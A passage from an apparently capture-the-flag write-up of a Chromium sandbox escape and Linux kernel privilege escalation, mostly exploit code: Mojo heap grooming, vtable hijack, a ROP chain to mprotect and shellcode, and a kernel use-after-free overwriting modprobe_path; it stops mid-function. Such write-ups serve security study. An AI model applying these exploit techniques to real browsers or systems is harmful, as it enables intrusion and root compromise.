<li>Re-allocate those 0x20 free chunks by creating lots of <code>CtfInterfaceImpl</code> with a size 4 <code>numbers_</code> vector ( which will also allocate a 0x20 heap chunk ). The allocation sequence of <code>CtfInterfaceImpl</code> -&gt; <code>size 4 numbers_</code> -&gt; <code>CtfInterfaceImpl</code> -&gt; <code>size 4 numbers_</code>... will probably results in a <code>CtfInterfaceImpl</code> object being placed right behind a size 4 <code>numbers_</code> vector. </li>
</ul>
<p>Here&#39;s the Javascript snippet:</p>
<pre class="hljs"><code>A = [];
B = [];
<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;

<span class="hljs-comment">// First allocate lots of CtfInterfaceImpl object</span>
<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
    A.push(<span class="hljs-literal">null</span>);
    A[i] = <span class="hljs-keyword">new</span> blink.mojom.CtfInterfacePtr();
    Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(A[i]).handle);
}

<span class="hljs-comment">// Free all the CtfInterfaceImpl, creating lots of free chunk ( size: 0x20 )</span>
<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
    A[i].ptr.reset();
}

<span class="hljs-comment">// Re-allocate those 0x20 free chunks with the following allocation sequence: </span>
<span class="hljs-comment">// CtfInterfaceImpl -&gt; size 4 double vector -&gt; CtfInterfaceImpl -&gt; size 4 double vector...</span>
<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
    B.push(<span class="hljs-literal">null</span>);
    B[i] = <span class="hljs-keyword">new</span> blink.mojom.CtfInterfacePtr();
    Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(B[i]).handle);
    B[i].resizeVector(<span class="hljs-number">0x4</span>); <span class="hljs-comment">// double vector with size 4 == allocate a 0x20 chunk</span>
}

<span class="hljs-comment">// Write value to B[i] for debug usage</span>
<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
    <span class="hljs-keyword">await</span> B[i].write(itof(<span class="hljs-built_in">BigInt</span>(i)), <span class="hljs-number">0</span>);
}
</code></pre><p>By doing this, we found that there&#39;s a high probability that <code>CtfInterfaceImpl</code> object <code>B[2]</code> will be placed right behind <code>B[0]</code>&#39;s <code>numbers_</code> vector. By using the OOB read/write on <code>B[0]-&gt;numbers_</code>, we&#39;ll be able to leak some address and hijack the control flow.</p>
<p>However there&#39;s still a possibility that <code>B[2]</code> won&#39;t be placed right behind <code>B[0]-&gt;numbers_</code>, so before we continue our exploitation, we&#39;ll have to make sure that the current heap layout is exploitable:</p>
<pre class="hljs"><code><span class="hljs-comment">// leak address from B[2]</span>
<span class="hljs-keyword">var</span> vtable = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].read(<span class="hljs-number">4</span>)).value; <span class="hljs-comment">// vtable</span>
<span class="hljs-keyword">var</span> heap1 = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].read(<span class="hljs-number">5</span>)).value; <span class="hljs-comment">// numbers_ ( vector_begin )</span>
<span class="hljs-keyword">var</span> heap2 = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].read(<span class="hljs-number">6</span>)).value; <span class="hljs-comment">// numbers_ ( vector_end )</span>

vtable = ftoi(vtable);
heap1 = ftoi(heap1);
heap2 = ftoi(heap2);
<span class="hljs-comment">/* Check if B[2] is right behind B[0]-&gt;numbers_ */</span>
<span class="hljs-keyword">if</span> ((heap1 + <span class="hljs-number">0x20n</span> == heap2) &amp;&amp; ( (vtable &amp; <span class="hljs-number">0xfffn</span>) == <span class="hljs-number">0x4e0n</span>)) { <span class="hljs-comment">// Pass check !</span>
    print(<span class="hljs-string">&quot;OK!&quot;</span>);
    print(hex(vtable));
    print(hex(heap1));
    print(hex(heap2));
} <span class="hljs-keyword">else</span> { <span class="hljs-comment">// Failed ! reload page and restart SBX exploit</span>
    <span class="hljs-built_in">window</span>.location.reload();
}
</code></pre><p>Here we use the values we leaked from <code>B[0]-&gt;numbers_</code> and see if they contain the vtable address of <code>CtfInterfaceImpl</code> and the heap address of <code>B[2]-&gt;numbers_</code>. If it passes the check, continue our exploit, or else we&#39;ll have to reload the page and restart our SBX exploit.</p>
<p>By now we&#39;re able to corrupt the <code>B[2]</code> object and do some interesting stuff. For example, we can achieve arbitrary read/write by corrupting the pointer of <code>B[2]-&gt;numbers_</code>:</p>
<pre class="hljs"><code><span class="hljs-comment">// Now B[0] can control B[2]-&gt;numbers_&#x27;s data pointer by setting B[0].Write(xxx, 5)</span>
<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaw</span>(<span class="hljs-params">address, value</span>) </span>{
    <span class="hljs-comment">// arbitrary write</span>
    <span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].write(itof(address), <span class="hljs-number">5</span>);
    <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(value), <span class="hljs-number">0</span>);
}

<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aar</span>(<span class="hljs-params">address</span>) </span>{
    <span class="hljs-comment">// arbitrary read</span>
    <span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].write(itof(address), <span class="hljs-number">5</span>);
    <span class="hljs-keyword">var</span> v = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].read(<span class="hljs-number">0</span>)).value;
    <span class="hljs-keyword">return</span> ftoi(v);
}
</code></pre><p>However, it seems that we don&#39;t need those arbitrary read/write primitive after all. Since now we have the base address of <code>chromium</code> ( the vtable address ) and the heap buffer address ( <code>B[2]-&gt;numbers_</code> ), we ended up using the following exploit plan to achieve RCE:</p>
<ul class="list">
<li>We placed all of our payload ( fake vtable entry, ROP chain and shellcode ) in the heap buffer of <code>B[2]-&gt;numbers_</code> ( the content of <code>B[2]-&gt;numbers_</code> is totally controllable, plus there&#39;s no size limit ).</li>
<li>We then modify the vtable of <code>B[2]</code> to point to our crafted heap buffer.</li>
<li>By calling <code>B[2].ptr.reset()</code>, it will trigger the destructor of <code>B[2]</code> and jump to our fake vtable entry, which points to our stack pivoting ROP gadget: <code>xchg rax, rsp; add cl, byte ptr [rax - 0x77]; ret;</code>.</li>
<li>After stack pivoting, the stack will be migrated to our crafted heap buffer and start doing ROP. Our ROP chain will do <code>sys_mprotect( heap &amp; ~0xfff, 0x2000, 7 )</code>, making our crafted heap buffer executable.</li>
<li>Finally, the ROP chain will jump to our shellcode ( which is also placed on our crafted heap buffer ) and execute our kernel exploit.</li>
</ul>
<p>Here&#39;s our final exploit script for the sandbox challenge ( in a form of a single Javascript file ):</p>
<pre class="hljs"><code>arb = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">8</span>);
f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(arb);
B64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BigInt64Array</span>(arb);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ftoi</span>(<span class="hljs-params">f</span>) </span>{
    f64[<span class="hljs-number">0</span>] = f;
    <span class="hljs-keyword">return</span> B64[<span class="hljs-number">0</span>];
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">itof</span>(<span class="hljs-params">i</span>) </span>{
    B64[<span class="hljs-number">0</span>] = i;
    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn_sbx</span>(<span class="hljs-params"></span>) </span>{
    print(<span class="hljs-string">&#x27;In sbx!&#x27;</span>);
    (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"></span>) </span>{
        A = [];
        B = [];
        <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// First allocate lots of CtfInterfaceImpl object</span>
        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
            A.push(<span class="hljs-literal">null</span>);
            A[i] = <span class="hljs-keyword">new</span> blink.mojom.CtfInterfacePtr();
            Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(A[i]).handle);
        }

        <span class="hljs-comment">// Free all the CtfInterfaceImpl, creating lots of free chunk ( size: 0x20 )</span>
        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
            A[i].ptr.reset();
        }

        <span class="hljs-comment">// Re-allocate those 0x20 free chunks with the following allocation sequence: </span>
        <span class="hljs-comment">// CtfInterfaceImpl -&gt; size 4 double vector -&gt; CtfInterfaceImpl -&gt; size 4 double vector...</span>
        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
            B.push(<span class="hljs-literal">null</span>);
            B[i] = <span class="hljs-keyword">new</span> blink.mojom.CtfInterfacePtr();
            Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(B[i]).handle);
            B[i].resizeVector(<span class="hljs-number">0x4</span>); <span class="hljs-comment">// double vector with size 4 == allocate a 0x20 chunk</span>
        }

        <span class="hljs-comment">// Write value to B[i] for debug usage</span>
        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">0x1000</span> ; i++) {
            <span class="hljs-keyword">await</span> B[i].write(itof(<span class="hljs-built_in">BigInt</span>(i)), <span class="hljs-number">0</span>);
        }

        <span class="hljs-comment">// leak address from B[2]</span>
        <span class="hljs-keyword">var</span> vtable = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].read(<span class="hljs-number">4</span>)).value; <span class="hljs-comment">// vtable</span>
        <span class="hljs-keyword">var</span> heap1 = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].read(<span class="hljs-number">5</span>)).value; <span class="hljs-comment">// numbers_ ( vector_begin )</span>
        <span class="hljs-keyword">var</span> heap2 = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].read(<span class="hljs-number">6</span>)).value; <span class="hljs-comment">// numbers_ ( vector_end )</span>

        vtable = ftoi(vtable);
        heap1 = ftoi(heap1);
        heap2 = ftoi(heap2);
        <span class="hljs-comment">/* Check if B[2] is right behind B[0]-&gt;numbers_ */</span>
        <span class="hljs-keyword">if</span> ((heap1 + <span class="hljs-number">0x20n</span> == heap2) &amp;&amp; ( (vtable &amp; <span class="hljs-number">0xfffn</span>) == <span class="hljs-number">0x4e0n</span>)) { <span class="hljs-comment">// pass check !</span>
            print(<span class="hljs-string">&quot;OK!&quot;</span>);
            print(hex(vtable));
            print(hex(heap1));
            print(hex(heap2));
        } <span class="hljs-keyword">else</span> { <span class="hljs-comment">// failed ! reload page and restart SBX exploit</span>
            <span class="hljs-built_in">window</span>.location.reload();
        }

        <span class="hljs-comment">// Now B[0] can control B[2]&#x27;s data pointer by setting B[0].Write(xxx, 5)</span>
        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaw</span>(<span class="hljs-params">address, value</span>) </span>{
            <span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].write(itof(address), <span class="hljs-number">5</span>);
            <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(value), <span class="hljs-number">0</span>);
        }

        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aar</span>(<span class="hljs-params">address</span>) </span>{
            <span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].write(itof(address), <span class="hljs-number">5</span>);
            <span class="hljs-keyword">var</span> v = (<span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].read(<span class="hljs-number">0</span>)).value;
            <span class="hljs-keyword">return</span> ftoi(v);
        }

        <span class="hljs-keyword">var</span> chrome_base = vtable - <span class="hljs-number">0xbc774e0n</span>; <span class="hljs-comment">// get chrome base address</span>
        <span class="hljs-keyword">var</span> chrome_base_rop = chrome_base + <span class="hljs-number">0x33c9000n</span>; <span class="hljs-comment">// We found ROP gadgets in a weird way, so we need another base address for our ROP gadgets</span>
        xchg_rax_rsp = chrome_base_rop + <span class="hljs-number">0x8f0e18n</span>; <span class="hljs-comment">// xchg rax, rsp; add cl, byte ptr [rax - 0x77]; ret;</span>
        pop1 = chrome_base_rop + <span class="hljs-number">0x29ddebn</span>; <span class="hljs-comment">// pop r12; ret</span>
        pop_rax = chrome_base_rop + <span class="hljs-number">0x50404n</span>; <span class="hljs-comment">// pop rax; ret;</span>
        pop_rsi = chrome_base_rop + <span class="hljs-number">0xc5daen</span>; <span class="hljs-comment">// pop rsi; ret;</span>
        pop_rdx = chrome_base_rop + <span class="hljs-number">0x28c332n</span>; <span class="hljs-comment">// pop rdx; ret; </span>
        pop_rdi = chrome_base_rop + <span class="hljs-number">0x20b45dn</span>; <span class="hljs-comment">// pop rdi; ret; </span>
        syscall_ret = chrome_base + <span class="hljs-number">0x800dd77n</span>; <span class="hljs-comment">// syscall; ret;</span>
        jmp_rax = chrome_base_rop + <span class="hljs-number">0xbcfn</span>; <span class="hljs-comment">// jmp rax;</span>
        
        <span class="hljs-comment">/* Our ROP chain */</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(pop1), <span class="hljs-number">0</span>); <span class="hljs-comment">// ROP will start from here</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(xchg_rax_rsp), <span class="hljs-number">1</span>); <span class="hljs-comment">// vtable will jump to here</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(pop_rax), <span class="hljs-number">2</span>); <span class="hljs-comment">// pop rax</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(<span class="hljs-number">10n</span>), <span class="hljs-number">3</span>); <span class="hljs-comment">// rax = 10 ( mprotect&#x27;s syscall number )</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(pop_rdx), <span class="hljs-number">4</span>); <span class="hljs-comment">// pop rdx</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(<span class="hljs-number">7n</span>), <span class="hljs-number">5</span>); <span class="hljs-comment">// rdx = 7 ( PROT = rwx )</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(pop_rsi), <span class="hljs-number">6</span>); <span class="hljs-comment">// pop rsi</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(<span class="hljs-number">0x2000n</span>), <span class="hljs-number">7</span>); <span class="hljs-comment">// rsi = 0x2000</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(pop_rdi), <span class="hljs-number">8</span>); <span class="hljs-comment">// pop rdi</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof((heap1 &amp; (~<span class="hljs-number">0xfffn</span>))), <span class="hljs-number">9</span>); <span class="hljs-comment">// rdi = heap1 &amp; (~0xfff)</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(syscall_ret), <span class="hljs-number">10</span>); <span class="hljs-comment">// do syscall ( mprotect(heap1 &amp; ~0xfff, 0x2000, 7) )</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(pop_rax), <span class="hljs-number">11</span>); <span class="hljs-comment">// pop rax</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(heap1+<span class="hljs-number">0x100n</span>), <span class="hljs-number">12</span>); <span class="hljs-comment">// rax = heap1 + 0x100</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(jmp_rax), <span class="hljs-number">13</span>); <span class="hljs-comment">// jmp to RAX ( B[2]-&gt;numbers_[32], our shellcode )</span>

        <span class="hljs-comment">/* Our shellcode */</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].write(itof(<span class="hljs-number">0xfeebn</span>), <span class="hljs-number">32</span>); <span class="hljs-comment">// infinite loop</span>
        <span class="hljs-comment">//await B[2].write(itof(shellcode in BigInt), 33); </span>
        <span class="hljs-comment">//await B[2].write(itof(shellcode in BigInt), 34); </span>
        <span class="hljs-comment">//.............. </span>

        <span class="hljs-comment">/* Change B[2]&#x27;s vtable and trigger destructor, jump to our ROP chain*/</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">0</span>].write(itof(heap1), <span class="hljs-number">4</span>); <span class="hljs-comment">// change B[2]&#x27;s vtable</span>
        <span class="hljs-keyword">await</span> B[<span class="hljs-number">2</span>].ptr.reset(); <span class="hljs-comment">// call [rax+8] == xchg rax, rsp...</span>

        print(<span class="hljs-string">&quot;Done&quot;</span>); <span class="hljs-comment">// Should never reach here</span>
    })();
}
</code></pre><h4 id="local-privilege-escalation--kernel-"><a class="header-link" href="#local-privilege-escalation--kernel-"></a>Local Privilege Escalation ( kernel )</h4>
<p>In this part of challenge, it installs a kernel module which will expose a device at <code>/dev/ctf</code>. It implements several functions: <code>ctf_read</code>, <code>ctf_write</code>, <code>ctf_ioctl</code> and <code>ctf_open</code>. We can use <code>ctf_ioctl</code> to allocate a kernel heap buffer for <code>ctf_read</code> and <code>ctf_write</code>&#39;s usage. <code>ctf_ioctl</code> also allow us to free a kernel heap buffer. </p>
<p>There are two vulnerabilities we used for achieve local privilege escalation. Both are in <code>ctf_ioctl</code>. An uninitialized heap is used for allocating the buffer. Because it didn&#39;t zero out the buffer, we can use it for address leaking. Another vulnerability is use-after-free. When we free a kernel heap buffer, it didn&#39;t set its pointer to NULL, making it still accessible with <code>ctf_read</code> and <code>ctf_write</code>.</p>
<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ctf_data</span> {</span>
  <span class="hljs-keyword">char</span> *mem;
  <span class="hljs-keyword">size_t</span> size;
};

<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">ctf_ioctl</span><span class="hljs-params">(struct file *f, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span>
</span>{
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ctf_data</span> *<span class="hljs-title">data</span> =</span> f-&gt;private_data;
  <span class="hljs-keyword">char</span> *mem;

  <span class="hljs-keyword">switch</span>(cmd) {
  <span class="hljs-keyword">case</span> <span class="hljs-number">1337</span>:
    <span class="hljs-keyword">if</span> (arg &gt; <span class="hljs-number">2000</span>) {
      <span class="hljs-keyword">return</span> -EINVAL;
    }

    mem = kmalloc(arg, GFP_KERNEL);
    <span class="hljs-keyword">if</span> (mem == <span class="hljs-literal">NULL</span>) {
      <span class="hljs-keyword">return</span> -ENOMEM;
    }

    data-&gt;mem = mem;
    data-&gt;size = arg;
    <span class="hljs-keyword">break</span>;

  <span class="hljs-keyword">case</span> <span class="hljs-number">1338</span>:
    kfree(data-&gt;mem);
    <span class="hljs-keyword">break</span>;

  <span class="hljs-keyword">default</span>:
    <span class="hljs-keyword">return</span> -ENOTTY;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre><p>First we need to leak kernel text base address. We spray a lot of <code>struct tty_struct</code> to make kernel heap contain lots of <code>tty_operations</code> data, which includes lots of kernel address.</p>
<pre class="hljs"><code><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++)
    fd[i] = open(ptmx,<span class="hljs-number">2</span>);
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++)
    close(fd[i]);
</code></pre><p>Then we can use <code>ctf_ioctl</code> to allocate the heap buffer with the same size as <code>struct tty_struct</code>, letting us able to get those kernel address with <code>ctf_read</code>.</p>
<pre class="hljs"><code><span class="hljs-keyword">int</span> ctf = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ctf&quot;</span>,<span class="hljs-number">2</span>);
<span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1337</span>,<span class="hljs-number">0x2c0</span>); <span class="hljs-comment">// allocate heap size same as tty_struct</span>
<span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];
<span class="hljs-built_in">read</span>(ctf,buf,<span class="hljs-number">0x100</span>); <span class="hljs-comment">// leak kernel base address</span>
<span class="hljs-keyword">size_t</span>* p = (<span class="hljs-keyword">size_t</span>*)buf;
<span class="hljs-keyword">size_t</span> kaddr = p[<span class="hljs-number">3</span>] - <span class="hljs-number">0x20745e0</span>;
</code></pre><p>With the kernel address, our next step is to achieve kernel address arbitrary write. We can use the internal data structure <code>struct ctf_data</code> to achieve this. We first allocate a buffer which size is same as <code>struct ctf_data</code> and free it. Then, we spray a lot of <code>struct ctf_data</code> to make it allocate the buffer we just freed. We then can modify <code>struct ctf_data</code> from another file descriptor with <code>ctf_write</code>.</p>
<pre class="hljs"><code><span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1338</span>,<span class="hljs-number">0x0</span>);
<span class="hljs-comment">// Allocate buffer size same as ctf_data, then free it. </span>
<span class="hljs-comment">// We later use ctf_write on this buffer to modify struct ctf_data</span>
<span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1337</span>,<span class="hljs-number">0x10</span>);
<span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1338</span>,<span class="hljs-number">0x0</span>);
<span class="hljs-comment">// spray lots of struct ctf_data</span>
<span class="hljs-comment">// one of them will use the heap buffer we just freed</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++){
    fd[i] = <span class="hljs-built_in">open</span>(ctfpath, <span class="hljs-number">2</span>); <span class="hljs-comment">// open /dev/ctf</span>
}
<span class="hljs-comment">// for scanning usage</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++){
    <span class="hljs-built_in">ioctl</span>(fd[i],<span class="hljs-number">1337</span>,<span class="hljs-number">0x100</span>*(i+<span class="hljs-number">1</span>));
}
</code></pre><p>Once we can fully control a <code>struct ctf_data</code>, we can just modify <code>mem</code> and <code>size</code> to achieve kernel address arbitrary write. We choose to modify <code>modprobe_path</code> to achieve local privilege escalation.</p>
<pre class="hljs"><code><span class="hljs-comment">// Get the fd of our victim ctf_data</span>
<span class="hljs-built_in">read</span>(ctf,buf,<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">int</span> idx = p[<span class="hljs-number">1</span>]/<span class="hljs-number">0x100</span><span class="hljs-number">-1</span>;
<span class="hljs-comment">// Modify the ctf_data structure</span>
<span class="hljs-comment">// mem pointer will become modprobe_path</span>
<span class="hljs-keyword">size_t</span> payload[] = {kaddr+<span class="hljs-number">0x244DD40</span>,<span class="hljs-number">0x100</span>};
<span class="hljs-built_in">write</span>(ctf,payload,<span class="hljs-number">0x10</span>);
<span class="hljs-comment">// Overwrite modprobe_path</span>
<span class="hljs-keyword">char</span> path[] = <span class="hljs-string">&quot;/tmp/x&quot;</span>;
<span class="hljs-built_in">write</span>(fd[idx],path,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(path));
</code></pre><p>We plan to execute our entire kernel exploit in pure shellcode format. Here we create a Makefile which can create a 0x1000 bytes shellcode from a C source. The shellcode will be created at the first 0x1000 bytes of <code>sc.bin</code>. </p>
<pre class="hljs"><code>all: <span class="hljs-keyword">sc</span>.bin

<span class="hljs-keyword">sc</span>.bin: <span class="hljs-keyword">sc</span>.o
    ld --oformat=binary <span class="hljs-keyword">sc</span>.o -o <span class="hljs-keyword">sc</span>.bin -Ttext 0 -Tbss 0xc00  -Tdata 0x800
<span class="hljs-keyword">sc</span>.o:    <span class="hljs-keyword">sc</span>.c
    gcc -fomit-frame-pointer -fno-<span class="hljs-keyword">stack</span>-protector -nostdlib -fPIE -masm=intel -c <span class="hljs-keyword">sc</span>.c

clean:
    <span class="hljs-keyword">rm</span> <span class="hljs-keyword">sc</span>.bin <span class="hljs-keyword">sc</span>.o
</code></pre><p>The exploit in C :</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span>

<span class="hljs-keyword">int</span> fd[<span class="hljs-number">0x100</span>];
<span class="hljs-keyword">char</span> ctfpath[] = <span class="hljs-string">&quot;/dev/ctf&quot;</span>;
<span class="hljs-keyword">char</span> ptmx[] = <span class="hljs-string">&quot;/dev/ptmx&quot;</span>;
<span class="hljs-keyword">char</span> msg[] = <span class="hljs-string">&quot;#!/bin/bash\ncat /dev/vdb&gt;/tmp/root&quot;</span>;
<span class="hljs-keyword">char</span> mess[] = <span class="hljs-string">&quot;\xff\xff\xff\xff&quot;</span>;
<span class="hljs-keyword">char</span> ybin[] = <span class="hljs-string">&quot;/tmp/y&quot;</span>;
<span class="hljs-keyword">char</span> flagpath[] = <span class="hljs-string">&quot;/tmp/root&quot;</span>;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">memfd_create</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* ptr,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span>;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">my_itoa</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val,<span class="hljs-keyword">char</span>* buf)</span></span>;

<span class="hljs-keyword">void</span> _start(){

    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++)
        fd[i] = <span class="hljs-built_in">open</span>(ptmx,<span class="hljs-number">2</span>);
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++)
        <span class="hljs-built_in">close</span>(fd[i]);
    
    <span class="hljs-keyword">int</span> ctf = <span class="hljs-built_in">open</span>(ctfpath,<span class="hljs-number">2</span>);
    <span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1337</span>,<span class="hljs-number">0x2c0</span>);
    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];
    <span class="hljs-built_in">read</span>(ctf,buf,<span class="hljs-number">0x100</span>);
    <span class="hljs-keyword">size_t</span>* p = (<span class="hljs-keyword">size_t</span>*)buf;
    <span class="hljs-keyword">size_t</span> kaddr = p[<span class="hljs-number">3</span>] - <span class="hljs-number">0x20745e0</span>;

    <span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1338</span>,<span class="hljs-number">0x0</span>);
    <span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1337</span>,<span class="hljs-number">0x10</span>);
    <span class="hljs-built_in">ioctl</span>(ctf,<span class="hljs-number">1338</span>,<span class="hljs-number">0x0</span>);
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++){
        fd[i] = <span class="hljs-built_in">open</span>(ctfpath,<span class="hljs-number">2</span>);
    }
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++){
        <span class="hljs-built_in">ioctl</span>(fd[i],<span class="hljs-number">1337</span>,<span class="hljs-number">0x100</span>*(i+<span class="hljs-number">1</span>));
    }
    <span class="hljs-built_in">read</span>(ctf,buf,<span class="hljs-number">0x10</span>);
    <span class="hljs-keyword">int</span> idx = p[<span class="hljs-number">1</span>]/<span class="hljs-number">0x100</span><span class="hljs-number">-1</span>;
    <span class="hljs-keyword">size_t</span> payload[] = {kaddr+<span class="hljs-number">0x244DD40</span>,<span class="hljs-number">0x100</span>};
    <span class="hljs-built_in">write</span>(ctf,payload,<span class="hljs-number">0x10</span>);
    <span class="hljs-keyword">char</span> path[] = <span class="hljs-string">&quot;/tmp/x&quot;</span>;
    <span class="hljs-built_in">write</span>(fd[idx],path,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(path));
    <span class="hljs-keyword">int</span> mod = <span class="hljs-built_in">open</span>(path,O_CREAT|O_WRONLY,<span class="hljs-number">0777</span>);
    <span class="hljs-built_in">write</span>(mod,msg,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(msg));
